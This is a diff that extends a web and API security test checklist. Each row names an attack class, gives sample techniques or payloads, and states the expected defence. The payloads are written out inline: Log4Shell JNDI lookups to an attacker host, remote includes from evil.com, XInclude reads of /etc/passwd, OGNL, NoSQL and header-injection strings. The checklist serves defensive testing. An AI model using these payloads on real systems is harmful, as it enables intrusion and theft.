@@ -445,6 +445,16 @@ T-132|Handshake|Origin validation¦auth token|Origin/auth checked
 T-133|Message Injection|SQLi¦XSS¦command injection in frames|Sanitized
 T-134|Unauthorized Subscription|Subscribe to others' channels|Authorized
 T-135|CSWSH|Cross-site WebSocket hijacking|Origin enforced
+T-197|WebSocket Authentication Bypass|Connect without token¦upgrade without auth|Auth on handshake
+T-198|WebSocket Message Type Confusion|Text vs binary frames¦mismatched payload types|Type enforced
+T-199|WebSocket Frame Fragmentation Injection|Split payload across frames¦reassembly bypass|Reassembled then sanitized
+T-200|WebSocket Message Replay|Replay valid frame¦replay during session|Nonce / idempotency
+T-201|WebSocket Subscription Array Injection|subscribe[]=victim_channel¦multiple channels|Authorization per channel
+T-202|WebSocket DoS|Message flood¦ping flood¦frame exhaustion|Rate limit
+T-203|WebSocket Compression Attack|permessage-deflate bomb|Size cap
+T-204|WebSocket Proxy/LB Bypass|Bypass auth at proxy layer|Auth end-to-end
+T-205|WebSocket CSRF (non-browser)|Forge upgrade request via CSRF|Origin + token
+T-206|WebSocket Path Traversal in Upgrade URL|/ws/../../admin|Path validated
 #CS|4|web|Client Storage
 T-136|localStorage/sessionStorage|Tokens¦PII|No secrets
 T-137|IndexedDB / Cache API|Sensitive data|No secrets
@@ -458,6 +468,21 @@ T-143|Source Map Exposure|.map files|Removed in prod
 #XML|4|both|XML
 T-144|XXE|File read¦SSRF¦blind OOB¦billion laughs|Disabled
 T-145|XSLT Injection|Template payload|Blocked
+T-182|Billion Laughs / XML Entity Expansion (XEE)|Nested entity expansion (10 levels)¦response time/memory measurement¦recursive entity bomb|Parser rejects entity expansion; DTD limits enforced
+T-183|Quadratic Blowup XML DoS|Large single entity repeated N times¦non-recursive expansion|Entity size limit enforced
+T-184|XInclude Attack|<xi:include href="file:///etc/passwd"/>¦nested include|XInclude disabled
+T-185|Blind XXE Error-based|Malformed external entity¦parse error reflection¦local file reference|No file content in errors
+T-186|Blind XXE Out-of-band|External DTD to attacker FTP/DNS¦parameter entity SYSTEM|No outbound resolution
+T-187|XXE via File Upload|Malicious SVG¦DOCX/XLSX metadata¦PDF XML attachment¦generic XML upload|Server-side parsers hardened
+T-188|XXE in SAML Assertions|Entity in saml:Assertion¦XML bomb in assertion|DTD disabled in SAML parser
+T-189|SOAP Injection / SOAPAction Spoofing|Injected XML tags in SOAP body¦SOAPAction header spoofing|Strict schema + action validation
+T-190|WSDL Disclosure & Abuse|?wsdl endpoint¦?singleWsdl¦internal operations leak|WSDL protected/removed in prod
+T-191|XML Signature Wrapping (general)|Move signed element¦wrap attacker payload¦signature block relocation|Signature covers correct node
+T-192|XML Namespace Abuse|Namespace confusion¦xs:any bypass|Namespace strict matching
+T-193|XML Schema Poisoning|Malicious XSD allowing arbitrary payloads¦schema substitution|Trusted XSD only
+T-194|XML-RPC Attacks|system.multicall amplification¦method injection¦xmlrpc.php abuse|Method allowlist + rate limit
+T-195|External DTD / Parameter Entity Bypass|% param entity bypass¦SYSTEM keyword bypass¦nested DTD|External entities fully disabled
+T-196|Compressed XML Bomb|Gzip/zip-bomb + XML parser¦deflate bomb|Decompression size cap
 #FIL|4|both|File
 T-146|Path Traversal|Read/write outside root|Blocked
 T-147|Zip Slip|../ in archive|Blocked
@@ -469,19 +494,79 @@ T-150|Cache Poisoning|X-Forwarded-Host¦X-Forwarded-For|Not trusted
 T-151|Request Smuggling|CL.TE¦TE.CL¦TE.TE|Rejected
 T-152|Response Splitting|CRLF in headers|Blocked
 T-153|HTTP/2 Downgrade|h2c smuggling|Blocked
+#H2|4|both|HTTP/2 and HTTP/3
+T-331|HTTP/2 Request Smuggling (H2.CL)|Content-Length mismatch in h2|Strict framing
+T-332|HTTP/2 Request Smuggling (H2.TE)|Transfer-Encoding in h2|Rejected
+T-333|HPACK Injection|Header table poisoning|Bounds enforced
+T-334|Pseudo-header Injection|:path¦:authority¦:method tampering|Validated
+T-335|HTTP/2 Downgrade Smuggling|h2 → h1 conversion smuggling|Strict
+T-336|HTTP/3 QUIC Attacks|QUIC-specific fuzz¦packet injection|Hardened
+T-337|HTTP/3 0-RTT Replay|Replay 0-RTT data|Anti-replay
+T-338|HTTP/3 Connection Migration Abuse|Spoof migration|Bound to CID
+T-339|:authority Host Injection|Override host via pseudo-header|Validated
 #OA|4|both|OAuth/OIDC
 T-154|Redirect URI|Open redirect¦wildcard|Strict match
 T-155|State/Nonce|Missing¦reuse|Enforced
 T-156|Token Leakage|Referer¦URL fragment|Not leaked
 T-157|Scope Escalation|Request extra scopes|Validated
+T-237|redirect_uri as Array|redirect_uri[]=https://evil.com|Rejected
+T-238|State Array/Object Injection|state[]=a&state[]=b|Rejected
+T-239|Scope Array Injection|scope[]=admin&scope[]=read|Validated
+T-240|response_type Array Injection|response_type[]=code&response_type[]=token|Rejected
+T-241|client_id Array Injection|client_id[]=a&client_id[]=b|Rejected
+T-242|Nonce Array/Reuse|nonce[]=...¦replay nonce|Bound to session, single-use
+T-243|Code Array in Token Exchange|code[]=victim_code|Rejected
+T-244|PKCE code_verifier Array/Bypass|Omit or array code_verifier|PKCE enforced
+T-245|grant_type Array Injection|grant_type[]=password&grant_type[]=client_credentials|Rejected
+T-246|client_secret Array/Type Confusion|client_secret[]=...|Type check
+T-247|Device-Code Phishing/Brute-force|Guess user_code¦social engineering|Rate limit + short TTL
+T-248|Consent Phishing|Malicious app requests broad scopes|Scope review enforced
+T-249|OAuth Mix-up Attack|Cross-IdP confusion|Per-IdP state binding
+T-250|Hybrid Flow Injection|Inject code + id_token|Flow isolation
+T-251|Refresh Token Array/Rotation Bypass|refresh_token[]=...|Type check + rotation
+T-252|Token Endpoint Content-Type Confusion|JSON vs form|Single canonical format
+T-253|aud Claim Injection|Modify aud in code/ID token|Signature + aud validation
+T-254|id_token_hint Array/Tampering|id_token_hint[]=...|Validated
+T-255|login_hint Array/Account Takeover|login_hint=victim@x.com|Bound to session
+T-256|prompt=none Bypass|Skip consent via prompt=none|Consent enforced
 #SAML|4|both|SAML
 T-158|Signature Wrapping|XSW attacks|Validated
 T-159|XXE in Assertion|Payload|Disabled
+T-222|SAML Assertion Replay|Reuse valid assertion|InResponseTo + one-time use
+T-223|NotOnOrAfter / NotBefore Bypass|Tamper timestamps|Timestamps validated
+T-224|Audience Restriction Bypass|Wrong Audience|Enforced
+T-225|Recipient Validation Bypass|Wrong Recipient|Enforced
+T-226|InResponseTo Validation Bypass|Missing/mismatched|Enforced
+T-227|Issuer Spoofing|Attacker IdP issuer|Allowlist
+T-228|NameID Injection/Array|NameID[]=admin|Type + validation
+T-229|SAML Attribute Injection|Role[]=admin|Server-side attribute mapping
+T-230|Metadata Manipulation|Malicious IdP metadata|Metadata signed/validated
+T-231|SAML Logout CSRF|Forced logout of victim|CSRF token
+T-232|SAML-to-OAuth Confusion|Cross-protocol token reuse|Protocol isolation
+T-233|Signature Stripping|Remove signature|Signature required
+T-234|Certificate Confusion|Signed by attacker cert|Pinned cert
+T-235|RelayState Open Redirect|RelayState=//evil.com|Validated
+T-236|SAML Compression Bomb|Deflate bomb in SAMLResponse|Size cap
 #GQL|4|api|GraphQL
 T-160|Introspection|Enabled in prod|Disabled
 T-161|Batching Abuse|Query batching¦alias overloading|Limited
 T-162|Injection|Args¦directives|Sanitized
 T-163|Field-level Auth|Sensitive fields|Authorized
+T-207|Field-suggestion Discovery|Typo-triggered suggestions|Suggestions disabled in prod
+T-208|Alias Overloading|Many aliases in one query|Complexity limit
+T-209|Mutation Authorization Bypass|Direct mutation without role|Field-level auth
+T-210|Subscription Auth Bypass|Subscribe without auth|Auth on connect
+T-211|Depth-limit Bypass via Fragments|Deep nested fragments|Depth computed on expanded AST
+T-212|Recursive Fragment DoS|Self-referencing fragments|Fragment limit
+T-213|Directive Injection|Custom @skip/@include abuse|Directive allowlist
+T-214|Variable Injection|{"username":{"$ne":null}} in variables|Type validation
+T-215|Batching CSRF|Batch mutations without CSRF|CSRF + batch limit
+T-216|Persisted-query Bypass|Forge persisted hash|Hash allowlist
+T-217|__schema / __type Enumeration|Full schema dump|Introspection disabled
+T-218|__typename Injection|Type confusion|Type validation
+T-219|Interface / Union Type Bypass|Cast to unauthorized type|Field-level auth
+T-220|Input Coercion Bypass|String → array|Strict coercion
+T-221|GET-based Query Abuse / Cache Poisoning|GET /graphql?query=...|GET disabled for mutations
 #RL|4|both|Rate Limiting
 T-164|Global|IP¦user¦endpoint|Enforced
 T-165|Bypass|X-Forwarded-For rotation¦header spoof|Cannot bypass
@@ -497,6 +582,17 @@ T-171|HTTP Verbose Headers|X-Powered-By¦Server|Minimized
 T-172|Robots.txt / Sitemap|Hidden paths|Reviewed
 T-173|Git/SVN Metadata|.git/¦.svn/|Blocked
 T-174|Source Code Disclosure|.php~¦.jsp.bak|Blocked
+T-290|Emails in HTML/JS|Scrape JS for @|Minimized
+T-291|Phone Numbers in HTML/JS|Scrape JS|Minimized
+T-292|Internal IPs in HTML/JS|10.x¦192.168.x|Removed
+T-293|Cloud Bucket Names in JS|s3.amazonaws.com/...|Removed
+T-294|API Endpoints in JS|Hidden endpoints|Documented only
+T-295|GraphQL Endpoint Discovery|/graphql¦/api/graphql|Protected
+T-296|Swagger / OpenAPI Discovery|/swagger.json¦/openapi.json|Protected
+T-297|.well-known Endpoints|/.well-known/*|Reviewed
+T-298|security.txt Exposure|/.well-known/security.txt|Reviewed
+T-299|robots.txt Array|List hidden paths|Reviewed
+T-300|sitemap.xml Array|List all URLs|Reviewed
 #SUB|4|both|Subdomain
 T-175|Takeover|Dangling CNAME|Claimed
 #DNS|4|both|DNS
@@ -506,9 +602,155 @@ T-177|Certificate Transparency|Leaked subdomains|Reviewed
 #CLD|4|both|Cloud
 T-178|Metadata Service|169.254.169.254 via SSRF|Blocked
 T-179|S3/GCS Bucket|Public listing/write|Restricted
+T-257|Azure Blob Storage Misconfig|Public container listing|Private ACL
+T-258|GCP Storage Misconfig|storage.googleapis.com/bucket listing|Private ACL
+T-259|Cloud IAM Misconfig|Over-privileged roles|Least privilege
+T-260|Cloud Function / Lambda Abuse|Event injection|Input validation
+T-261|Serverless Event Injection|Inject event fields|Schema validation
+T-262|Container Escape|Privileged container¦mount host|Hardened runtime
+T-263|Kubernetes Misconfig|Anonymous API server¦RBAC|Locked down
+T-264|Docker API Exposure|:2375 unauthenticated|TLS + auth
+T-265|Secrets Manager Misconfig|Public secret read|IAM scoped
+T-266|Cloud WAF Bypass|Encoding/fragmentation|WAF hardened
+T-267|Cloud Logging Gaps|Actions not logged|All actions logged
+T-268|Cloud CDN Cache Poisoning|Unkeyed headers|Cache key hardening
+T-269|Metadata SSRF via IPv6|[fd00:ec2::254]|Blocked
+T-270|Presigned URL Abuse|Long TTL / wrong scope|Short TTL + scoped
 #MOB|4|api|Mobile/API
 T-180|Certificate Pinning Bypass|Frida¦objection|Pinning enforced
 T-181|Root/Jailbreak Detection|Bypass|Enforced
+T-271|Hardcoded API Keys/Secrets|Decompile APK/IPA¦grep|No secrets in binary
+T-272|Insecure Local Storage|SQLite¦plist¦SharedPreferences¦Keychain|Encrypted storage
+T-273|Backup Extraction|adb backup¦iTunes backup|Backup disabled/encrypted
+T-274|WebView Injection|addJavascriptInterface¦loadUrl|Safe WebView config
+T-275|Deep-link Hijacking|Malicious app intercepts scheme|Verified App Links
+T-276|Intent Redirection|Explicit intent to internal|Component protection
+T-277|Clipboard Leakage|Copy sensitive data|Clipboard disabled for secrets
+T-278|Keyboard Cache|Sensitive input cached|autocorrect=false
+T-279|Screenshot / Screen-record Prevention|Sensitive screen capture|FLAG_SECURE
+T-280|Transport Security (ATS/cleartext)|HTTP endpoints in app|ATS / cleartext disabled
+T-281|Certificate Pinning Bypass (deep)|Frida/objection bypass|Pinning enforced
+T-282|Tampering Detection|Repackaged APK|Integrity check
+T-283|Anti-debugging|Attach debugger|Anti-debug enforced
+T-284|Obfuscation / Reverse Engineering|Decompile¦strings|Obfuscated
+T-285|Secure Key Storage|Keychain/Keystore misuse|Hardware-backed
+T-286|Push Notification Injection|Forge push payload|Signed push
+T-287|URL Scheme Hijacking|Register victim scheme|Scheme validation
+T-288|NFC / Bluetooth Attack Surface|Unauthenticated pairing|Auth required
+T-289|Biometric Bypass|Bypass FaceID/fingerprint|Server-side auth
+#LFI|4|both|LFI / RFI / Code Injection
+T-301|Local File Inclusion (LFI)|?file=../../etc/passwd¦path traversal in include¦/proc/self/environ|Allowlist on include paths
+T-302|Remote File Inclusion (RFI)|?file=http://evil.com/shell¦ftp://¦smb://|Remote includes disabled
+T-303|PHP Wrappers|php://filter¦php://input¦data://¦expect://|Wrappers disabled
+T-304|Log Poisoning for LFI|Inject PHP in access.log¦User-Agent poisoning¦Apache error log poisoning|Log sanitized
+T-305|eval Injection|User input into eval()¦dynamic code construction|No dynamic eval
+T-306|include / require Injection|User-controlled path¦remote include|Allowlist
+T-307|Expression Language (EL) Injection|\${7*7}¦#{7*7}¦\${applicationScope}|Escaped
+T-308|OGNL Injection (Struts2)|%{(#_='multipart/form-data')}¦%{#a=(new java.lang.ProcessBuilder(...))}|Patched
+T-309|Groovy Injection|Groovy script payload¦dynamic Groovy compilation|Sandboxed
+T-310|JNDI Injection (Log4Shell)|\${jndi:ldap://attacker/a}¦\${jndi:rmi://attacker/a}¦\${jndi:dns://}|Patched / disabled
+T-311|BeanShell Injection|Interpreter.eval¦script injection|No user eval
+T-312|Server-side JS Injection (Node)|eval()¦Function()¦require() injection|No user eval
+T-313|Python eval/exec Injection|eval() injection¦pickle deserialization|No eval
+T-314|Ruby eval Injection|eval() injection¦instance_eval|No eval
+T-315|Client-Side Template Injection|AngularJS {{7*7}}¦Vue {{7*7}}¦React template injection|Sandbox + escaping
+T-316|AngularJS Sandbox Escape|{{constructor.constructor('alert(1)')()}}|Sandbox/version current
+T-317|React dangerouslySetInnerHTML|HTML injection → XSS|Sanitized
+#ORED|4|both|Open Redirect
+T-318|Open Redirect (basic)|?next=//evil.com¦?url=https://evil.com¦?redirect=|Allowlist
+T-319|Open Redirect Bypass|https://trusted.com.evil.com¦//trusted.com@evil.com¦backslash bypass|Strict host check
+T-320|Open Redirect via Path Traversal|/redirect/../../evil.com|Path normalized
+T-321|Chain to OAuth/SAML|Open redirect in callback → token theft|Callback allowlist
+T-322|JavaScript location Injection|location.href = userInput¦window.location = userInput|Validated
+T-323|Meta Refresh Injection|<meta http-equiv="refresh" content="0;url=//evil">|Escaped
+#WCACHE|4|both|Web Cache Deception & Poisoning
+T-324|Web Cache Deception|/account/profile.css¦/account/profile.jpg cached as static|Auth-aware cache
+T-325|Cache Key Manipulation|?cb=1 vs ?cb=2¦unkeyed query params|Key normalization
+T-326|CDN Cache Poisoning|Unkeyed header injection¦X-Forwarded-Host|Header keyed
+T-327|Path Confusion|/account/..%2fprofile.css¦/account;profile.css|Path normalized
+T-328|X-Forwarded-Host Poisoning|Spoof host in cache|Header not trusted
+T-329|X-Forwarded-Scheme Poisoning|Spoof scheme|Header not trusted
+T-330|Unkeyed Query Param Poisoning|?utm=...¦?fbclid=... cached|Params keyed/ignored
+#CVEC|4|both|CVE-Specific Verifications
+T-340|Log4Shell (CVE-2021-44228)|\${jndi:ldap://attacker/a}¦\${jndi:rmi://}|Patched / JNDI off
+T-341|Spring4Shell (CVE-2022-22965)|Class loader manipulation¦data binding payload|Patched
+T-342|ProxyLogon / ProxyShell|Exchange auth bypass|Patched
+T-343|Citrix Bleed (CVE-2023-4966)|Session token leak|Patched
+T-344|MOVEit Transfer (CVE-2023-34362)|SQLi in upload|Patched
+T-345|PaperCut (CVE-2023-27350)|Auth bypass|Patched
+T-346|Confluence OGNL (CVE-2023-22515/22518)|OGNL payload|Patched
+T-347|Jenkins CVEs|Various endpoint abuse|Patched
+T-348|Fortinet SSL-VPN CVEs|Auth bypass|Patched
+T-349|Atlassian Jira CVEs|Various|Patched
+#CRED|4|both|Credential Attacks
+T-350|Password Spraying|One password × many users¦avoid lockout|Rate limit
+T-351|Rainbow Table / Hash Cracking|Weak hashes¦unsalted MD5/SHA1|Strong KDF
+T-352|Pass-the-Hash|NTLM hash reuse|Credential Guard
+T-353|Pass-the-Ticket|Kerberos ticket reuse|Ticket hardening
+T-354|Kerberoasting|SPN request + crack|Strong service acct passwords
+T-355|AS-REP Roasting|No pre-auth account|Pre-auth required
+T-356|Golden / Silver Ticket|Forge tickets|KRBTGT rotation
+T-357|NTLM Relay|Relay to SMB/LDAP|SMB signing
+T-358|Credential Stuffing via Array|username[]=a&username[]=b|Rejected
+T-359|Password Brute-force via Array|password[]=a&password[]=b|Rejected
+#EML|4|both|Email / SMS Injection
+T-360|SMTP Injection|email=victim@x.com%0aBcc:attacker@x.com|Header sanitized
+T-361|Email Header Injection|CRLF in From/To¦Bcc injection|Sanitized
+T-362|Email Bombing|High-volume to victim|Rate limit
+T-363|SMS Bombing|High-volume SMS|Rate limit
+T-364|Phone Number Enumeration|Differential responses|Uniform response
+T-365|SPF/DKIM/DMARC Bypass|Spoof sending domain|Enforced
+T-366|Verification Token in URL Array|token[]=...|Rejected
+T-367|SMS OTP Array Injection|otp[]=123456|Rejected
+#APPR|4|api|API Protocol Coverage
+T-368|gRPC Testing|Reflection¦auth bypass¦injection|Reflection off, auth on
+T-369|SOAP API Testing|Injection¦WSDL abuse|Hardened
+T-370|XML-RPC system.multicall|Batch calls|Rate limit
+T-371|JSON-RPC Batch Abuse|Batch method injection|Limit + auth
+T-372|Content-Type Negotiation Abuse|Accept: application/xml on JSON API|Single format
+T-373|X-HTTP-Method-Override Bypass|Override to DELETE/PUT|Ignored
+T-374|Parameter Pollution|?id=1&id=2|Canonical parser
+T-375|Array Parameter Injection|?id[]=1&id[]=2|Type validation
+T-376|JSON Array Injection|{"id":[1,2]}|Type validation
+T-377|BOLA via Array|?ids[]=1&ids[]=2|Ownership check per item
+T-378|Mass Assignment via Array|{"roles":["admin"]}|Server-side allowlist
+T-379|GraphQL File Upload|Multipart upload to GraphQL|Size + type check
+T-380|WebSocket API|See WS category|Hardened
+T-381|SSE Injection|text/event-stream injection|Sanitized
+T-382|Long-polling Abuse|Exhaust connections|Rate limit
+#BL|4|both|Business Logic Deep Dive
+T-383|Price Rounding / Decimal Precision|0.001 × 1000¦floating-point abuse|Server-side rounding
+T-384|Currency Conversion Manipulation|Tamper currency field|Server-side rate
+T-385|Subscription Upgrade/Downgrade Bypass|Direct plan change|Entitlement check
+T-386|Gift Card / Voucher Abuse|Reuse / guess codes|Single-use + entropy
+T-387|Loyalty Points Manipulation|Negative / overflow|Validated
+T-388|Referral Fraud|Self-referral¦array referrer|Validated
+T-389|Trial Reset via Email Array|email[]=a&email[]=b|Normalize + uniqueness
+T-390|Coupon Stacking|Multiple coupons|Server-side rule
+T-391|Negative Quantity Array|qty[]=-1|Type + range check
+T-392|Quantity Overflow|qty=999999999999|Range cap
+T-393|Payment Method Array|payment[]=card&payment[]=cash|Single value
+T-394|Cart Item Array Injection|items[]={"id":1,"price":0}|Server-side pricing
+T-395|TOCTOU|Check vs use race|Atomic ops
+T-396|Refund after Shipment|Refund + keep item|State machine
+T-397|Multi-Currency Rounding Abuse|Exploit conversion rounding|Server-side calc
+#FUP|4|both|File Upload Advanced
+T-398|Polyglot File|Valid JPG + PHP|Extension + magic check
+T-399|SVG XXE|<svg><!ENTITY ...>|Sanitized / DTD off
+T-400|ImageTragick (ImageMagick)|push graphic-context|Patched
+T-401|Zip Slip|../../etc/passwd in zip|Path validated
+T-402|Path Traversal in Filename|../../../shell.php|Sanitized
+T-403|Null Byte in Filename|shell.php%00.jpg|Null byte rejected
+T-404|Double Extension|x.jpg.php¦x.php.jpg|Allowlist
+T-405|Content-Type Confusion|image/jpeg with PHP body|Magic-byte check
+T-406|Magic Byte Bypass|Polyglot header|Multi-layer check
+T-407|AV Bypass|Obfuscated payload|Re-scan
+T-408|Presigned URL Abuse|Long TTL / wrong scope|Short TTL + scoped
+T-409|Direct Object Upload|Write to other users' path|Ownership check
+T-410|Upload Race Condition|Upload then delete|Atomic ops
+T-411|Size Bypass via Chunked|Chunked upload > limit|Enforce at all layers
+T-412|Upload CSRF|No CSRF token|Token enforced
+T-413|Upload Path Override|X-Original-URL|Headers not trusted
 #AU-LOG|5|web|Login
 AUTH-01|Credential Transport Encryption|HTTP login endpoint¦mixed content¦HSTS missing¦weak redirect|Credentials only transmitted over HTTPS
 AUTH-02|Default Credentials|admin/admin¦admin/password¦root/root¦tomcat/tomcat¦test/test¦blank password|Default accounts disabled or forced change
@@ -522,6 +764,46 @@ AUTH-09|Credential Stuffing|Breached credential lists¦rate limit absent|Throttl
 AUTH-10|Login CSRF|No CSRF token¦token reuse¦SameSite bypass|Login form CSRF-protected
 AUTH-11|HTTP Method Tampering|GET instead of POST for login¦method override headers|Method enforced
 AUTH-12|Host Header Injection in Login|X-Forwarded-Host spoofing¦password reset link poisoning|Host header validated
+AUTH-77|Username as Array|username[]=admin¦username[0]=admin&username[1]=user|Rejected / first-value-only enforced
+AUTH-78|Password as Array|password[]=pass¦password[0]=x&password[1]=y|Rejected
+AUTH-79|Duplicate Parameter Pollution|username=admin&username=victim|Consistent parser
+AUTH-80|JSON Body Array Injection|{"username":["admin","victim"],"password":"x"}|Type validation rejects array
+AUTH-81|JSON Object / Operator Injection|{"username":{"$ne":null},"password":{"$ne":null}}|Reject non-string types
+AUTH-82|Boolean Coercion|username=true¦password=1|Strict type check
+AUTH-83|Null / Empty Coercion|username=null¦password=|Rejected
+AUTH-84|Type Juggling / Magic Hash (PHP)|0e123456 == 0e789012 loose comparison|Strict === comparison
+AUTH-85|Object Injection in Form Body|username[__proto__][admin]=true|Input schema validation
+AUTH-86|Content-Type Confusion in Login|Same creds sent as form / JSON / multipart / XML|Single canonical parser
+AUTH-87|SQL Wildcard Injection in Login|%¦_ in username|Parameterized queries
+AUTH-88|LDAP Wildcard in Login|*)(uid=*¦admin*|Escaped LDAP filter
+AUTH-89|XPath Tautology in Login|' or '1'='1¦x' or 1=1 or 'x'='x|Escaped XPath
+AUTH-90|Null Byte Injection in Login|admin%00¦admin\x00|Null bytes rejected
+AUTH-91|Unicode Normalization Bypass|ＡＤＭＩＮ¦admın (dotless i)|NFKC + strict compare
+AUTH-92|Whitespace Padding|" admin"¦"admin "¦"admin\t"|Trim + exact match
+AUTH-93|Case-Sensitivity Bypass|Admin¦ADMIN¦aDmIn|Defined case policy
+AUTH-94|Email Plus-alias / Dot-trick|victim+1@x.com¦v.ictim@x.com|Normalize before match
+AUTH-95|URL / HTML Entity Encoding|%61dmin¦&#97;dmin|Decode then validate
+AUTH-96|Homoglyph / Confusable|Cyrillic аdmin vs Latin admin|Confusable detection
+AUTH-97|Malformed JSON / XML Login Body|Parser error → info leak / bypass|Generic errors
+AUTH-98|Conflicting Authorization Headers|Basic + Bearer simultaneously|Single scheme enforced
+AUTH-99|Credentials in GET URL|/login?user=a&pass=b|GET login rejected
+AUTH-100|Login CSRF Token Reuse / Fixation|Reuse token across sessions|Token bound to session
+AUTH-101|Login Response Body Tampering|Flip authenticated:false→true|Server-side enforcement
+AUTH-102|Login Error Differential|Status 200 vs 401 vs 403¦body length|Uniform errors
+AUTH-103|Login Timing Side-channel|Measure per-char response timing|Constant-time compare
+AUTH-104|Lockout Bypass via X-Forwarded-For|Rotate XFF to reset lockout|Lockout keyed on user, not IP
+AUTH-105|Rate-limit Bypass via Case/Whitespace|Admin¦ admin ¦ADMIN|Normalize before counting
+AUTH-106|Extremely Long Credentials|10 KB username/password|Length cap
+AUTH-107|Content-Length 0 / Chunked / CL.TE|Parser confusion|Strict parsing
+AUTH-108|Multiple Cookie Headers|Cookie: a=1¦Cookie: a=2|Defined merge policy
+AUTH-109|X-Original-URL / X-Rewrite-URL|Override path to reach protected page|Headers not trusted
+AUTH-110|Method Enumeration on /login|OPTIONS¦TRACE¦DELETE|Allowlist methods
+AUTH-111|Remember-me Replay After Password Change|Reuse cookie post-change|Invalidate on change
+AUTH-112|Cross-tenant Login|Same creds on other subdomain/tenant|Tenant isolation
+AUTH-113|OAuth/SSO Code Injected into Login|Inject code param into login flow|Flow isolation
+AUTH-114|Pre-auth Token Accepted Post-login|Reuse pre-auth session ID|Rotate on login
+AUTH-115|Login CSRF via SameSite=None|Missing SameSite on login form|SameSite=Lax/Strict
+AUTH-116|Password Change Without Re-auth|Change password, old session valid|Re-auth + invalidate
 #AU-REG|5|web|Registration
 AUTH-13|Mass Assignment / Role Injection|role=admin¦isAdmin=true¦verified=true¦plan=premium in JSON/form|Server ignores privileged fields
 AUTH-14|Duplicate Account Prevention|Same email re-registration¦case variation (Victim vs victim)¦whitespace variation¦Unicode confusable (vіctim Cyrillic)¦email plus-alias|Duplicates rejected, no account overwrite
@@ -534,6 +816,23 @@ AUTH-20|User Enumeration via Registration|"Email already exists" vs generic mess
 AUTH-21|Disposable Email Acceptance|mailinator.com¦guerrillamail.com¦plus-alias abuse|Disposable emails blocked if policy requires
 AUTH-22|Invite/Referral Bypass|Skip invite code¦reuse invite code¦predict invite code|Invite enforced if required
 AUTH-23|Terms of Service Bypass|accepted_terms=true without checkbox¦direct API call|ToS acceptance enforced
+AUTH-117|Array Username in Registration|username[]=admin&username[]=victim|Rejected
+AUTH-118|JSON Array in Registration Body|{"email":["a@x.com","b@x.com"]}|Rejected
+AUTH-119|Null Byte in Email|victim@x.com%00@evil.com|Null bytes rejected
+AUTH-120|Email Case-sensitivity Duplicate|Victim@x.com vs victim@x.com|Normalize before uniqueness check
+AUTH-121|Plus-alias / Dot-trick Duplicate|victim+1@x.com¦v.ictim@x.com|Normalize
+AUTH-122|Unicode Confusable Duplicate|Cyrillic і vs Latin i|Confusable detection
+AUTH-123|Whitespace-padded Email|" victim@x.com"|Trim
+AUTH-124|Array Role/Plan Injection|{"role":["admin"],"verified":["true"]}|Server ignores privileged fields
+AUTH-125|Prototype Pollution in Registration JSON|{"__proto__":{"isAdmin":true}}|Safe JSON parsing
+AUTH-126|Overlong Username/Email|10 KB fields|Length cap + truncation-safe
+AUTH-127|Registration CSRF|Missing token on register form|CSRF token enforced
+AUTH-128|Registration via GET|GET /register?email=...|POST only
+AUTH-129|Invite Code Brute-force / Enumeration|Sequential / guessable codes|Rate limit + CSPRNG
+AUTH-130|Invite Code Array|invite[]=code1&invite[]=code2|Rejected
+AUTH-131|CAPTCHA Bypass via Array/Null|captcha=[]¦captcha=null|Strict validation
+AUTH-132|Verification Token Array/Object|token[]=...¦token={"$ne":null}|Type check
+AUTH-133|Duplicate Registration Race|Two simultaneous registrations same email|DB unique constraint
 #AU-PWD|5|web|Forgot Password / Password Reset
 AUTH-24|User Enumeration via Reset|"Email sent" vs "Email not found"¦timing difference¦response length difference|Generic response for valid/invalid emails
 AUTH-25|Reset Token Strength|Predictable token (MD5 of email, timestamp)¦short token (<128 bits)¦sequential token¦GUID with weak PRNG|CSPRNG, ≥128 bits entropy
@@ -549,6 +848,26 @@ AUTH-34|Security Questions Weakness|Guessable questions (mother's maiden name)¦
 AUTH-35|Password Change (Authenticated)|Old password required¦current session invalidation¦other sessions invalidation|Re-authentication required, sessions invalidated
 AUTH-36|Email Spoofing Protection|SPF¦DKIM¦DMARC on sending domain|Anti-spoofing configured
 AUTH-37|SMS/Phone Reset|SIM swap risk¦OTP brute-force¦rate limiting on SMS cost|OTP rate-limited, phone verification strong
+AUTH-134|Array Email in Reset|email[]=victim@x.com&email[]=attacker@x.com|Rejected
+AUTH-135|JSON Array Email|{"email":["a","b"]}|Rejected
+AUTH-136|Email Case/Plus-alias Enumeration|Victim@x.com¦victim+1@x.com|Normalize + generic response
+AUTH-137|Reset Token Array|token[]=...|Rejected
+AUTH-138|Reset Token Object/Operator Injection|{"token":{"$ne":null}}|Type check
+AUTH-139|Reset Token via Path Override|X-Original-URL: /reset|Headers not trusted
+AUTH-140|Reset Token Brute-force|Enumerate 6-digit tokens|Rate limit + entropy
+AUTH-141|Reset Token Race Condition|Concurrent token use|Atomic single-use
+AUTH-142|Token Leakage via 3rd-party CDN/Analytics|Referer leaks token to CDN|Referrer-Policy + no token in URL
+AUTH-143|Token Reuse After Password Change|Reuse token post-change|Invalidate on change
+AUTH-144|Reset Link CRLF Injection in Host|Host: evil.com%0d%0a...|Host validated
+AUTH-145|SMS Reset with Array Numbers|phone[]=+1...&phone[]=+2...|Rejected
+AUTH-146|Token in Browser History / Autocomplete|Token in URL bar history|Token in POST body
+AUTH-147|Token in localStorage/sessionStorage|Token persisted client-side|Not stored
+AUTH-148|Reset Form CSRF / Missing Token|Submit reset without CSRF token|CSRF enforced
+AUTH-149|Security Question Array Injection|answer[]=a&answer[]=b|Rejected
+AUTH-150|Security Question Brute-force|Unlimited attempts|Rate limit + lockout
+AUTH-151|Reset Token Bound to Wrong User via Array|userId[]=1&userId[]=2|Token bound to user
+AUTH-152|Email Header Injection in Reset|email=victim@x.com%0aBcc:attacker@x.com|Header sanitized
+AUTH-153|Token in HTTP (not HTTPS) Link|Reset link over http://|HTTPS enforced
 #AU-OA|5|both|OAuth / OIDC
 AUTH-38|redirect_uri Manipulation|External domain¦subdomain¦path traversal (/callback/../evil)¦open redirect on trusted domain¦wildcard¦encoding tricks|Strict exact match on registered URI
 AUTH-39|Missing/Weak State Parameter|No state¦reusable state¦predictable state¦CSRF via missing state|State bound to session, validated
@@ -564,6 +883,26 @@ AUTH-48|Token Endpoint Security|HTTP instead of HTTPS¦client authentication byp
 AUTH-49|JWT in OAuth|alg:none¦weak HMAC secret¦claim tampering (sub, role)¦kid injection|JWT signature validated, claims verified
 AUTH-50|OIDC nonce Validation|Missing nonce¦reusable nonce¦nonce not tied to ID token|Nonce enforced and validated
